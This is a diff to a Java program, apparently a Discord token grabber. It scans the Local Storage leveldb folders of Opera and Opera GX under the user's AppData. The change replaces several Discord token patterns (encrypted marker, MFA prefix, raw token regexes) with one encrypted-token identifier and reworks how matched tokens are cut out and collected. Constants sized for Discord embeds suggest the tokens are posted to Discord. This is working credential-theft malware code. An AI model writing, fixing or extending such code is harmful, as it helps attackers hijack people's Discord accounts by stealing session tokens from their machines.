@@ -39,12 +39,7 @@ public final class Main {
     // --- KONSTANTEN ---
     private static final int DISCORD_EMBED_MAX_DESCRIPTION_LENGTH = 3500; // Discord limit is 4096, using 3500 for safety
     private static final int MAX_TOKEN_DISPLAY_LENGTH = 500;
-    private static final String[] DISCORD_TOKEN_PATTERNS = {
-        "dQw4w9WgXcQ",  // Encrypted token identifier
-        "mfa.",          // MFA token prefix
-        "[\\.a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27}",  // Regular Discord token pattern
-        "[\\.a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{38}"   // Alternative token pattern
-    };
+    private static final String DISCORD_TOKEN_PATTERN = "dQw4w9WgXcQ:"; // Discord's encrypted token identifier
 
     // --- HILFSMETHODEN ---
 
@@ -200,9 +195,6 @@ public final class Main {
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera GX Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
 
-        // Pre-compile regex pattern for performance
-        java.util.regex.Pattern tokenPattern = java.util.regex.Pattern.compile("[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}");
-
         for (File file : paths) {
             if (file == null || !file.exists() || !file.isDirectory()) {
                 continue;
@@ -213,55 +205,22 @@ public final class Main {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
-                        // Limit line length to avoid performance issues
-                        if (strLine.length() > 50000) {
-                            strLine = strLine.substring(0, 50000);
-                        }
-                        
-                        // Check for encrypted Discord token pattern (dQw4w9WgXcQ)
-                        int index = strLine.indexOf("dQw4w9WgXcQ");
+                        // Use the correct Discord token identifier pattern
+                        int index = strLine.indexOf(DISCORD_TOKEN_PATTERN);
                         if (index != -1) {
                             try {
-                                // Extract token after the pattern
-                                String afterPattern = strLine.substring(index);
-                                // Look for the full encrypted token
-                                int endIndex = afterPattern.indexOf("\"");
-                                if (endIndex > 11) {  // "dQw4w9WgXcQ" is 11 chars
-                                    String fullToken = afterPattern.substring(0, endIndex);
-                                    if (!temp.contains(fullToken) && !fullToken.isEmpty() && fullToken.length() > 20) {
-                                        temp.add(fullToken);
+                                // Extract token after the pattern using indexOf instead of split to avoid regex issues
+                                String afterPattern = strLine.substring(index + DISCORD_TOKEN_PATTERN.length());
+                                int quoteIndex = afterPattern.indexOf("\"");
+                                if (quoteIndex >= 0) {
+                                    String tokenPart = afterPattern.substring(0, quoteIndex);
+                                    if (!temp.contains(tokenPart) && !tokenPart.isEmpty()) {
+                                        temp.add(tokenPart);
                                     }
                                 }
                             } catch (Exception ignored) {
+                                // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
                             }
-                        }
-                        
-                        // Check for MFA tokens
-                        int mfaIndex = strLine.indexOf("mfa.");
-                        if (mfaIndex != -1) {
-                            try {
-                                String afterMfa = strLine.substring(mfaIndex);
-                                int endIndex = afterMfa.indexOf("\"");
-                                if (endIndex > 4) {  // "mfa." is 4 chars
-                                    String mfaToken = afterMfa.substring(0, endIndex);
-                                    if (!temp.contains(mfaToken) && !mfaToken.isEmpty() && mfaToken.length() > 50) {
-                                        temp.add(mfaToken);
-                                    }
-                                }
-                            } catch (Exception ignored) {
-                            }
-                        }
-                        
-                        // Search for regular Discord token patterns using optimized regex matching
-                        try {
-                            java.util.regex.Matcher matcher = tokenPattern.matcher(strLine);
-                            while (matcher.find()) {
-                                String potentialToken = matcher.group();
-                                if (potentialToken.length() >= 59 && !temp.contains(potentialToken)) {
-                                    temp.add(potentialToken);
-                                }
-                            }
-                        } catch (Exception ignored) {
                         }
                     }
                 } catch (Exception ignored) {
